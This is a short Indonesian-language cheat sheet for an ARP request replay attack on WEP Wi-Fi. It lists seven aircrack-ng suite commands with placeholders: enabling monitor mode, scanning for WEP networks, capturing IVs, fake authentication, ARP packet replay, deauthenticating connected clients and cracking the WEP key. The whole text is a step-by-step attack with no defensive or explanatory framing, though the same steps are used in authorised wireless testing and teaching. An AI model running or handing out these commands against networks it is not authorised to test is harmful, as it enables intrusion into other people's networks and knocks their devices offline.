# ARP Request Replay Attack

#### 1. Aktifkan Mode Monitor

```
airmon-ng check kill
airmon-ng start [interface]
```

#### 2. Scan Wi-Fi WEP

```
airodump-ng --encrypt wep [interface]
```

#### 3. Capture IVs

```
airodump-ng --bssid [bssid] --channel [channel] --ivs --write [output] [interface]
```

#### 4. Jalankan Serangan Fake Auth

```
aireplay-ng -1 0 -a [bssid] -h [mac_attacker] [interface]
```

#### 5. Jalankan Serangan ARP Request Replay

```
aireplay-ng -3 -b [bssid] -h [mac_attacker] [interface]
```

#### 6. Jalankan Serangan Deauth

```
aireplay-ng -0 10 -a [bssid] [interface]
```

#### 7. Crack Kunci WEP

```
aircrack-ng -a 1 [file_ivs]
```
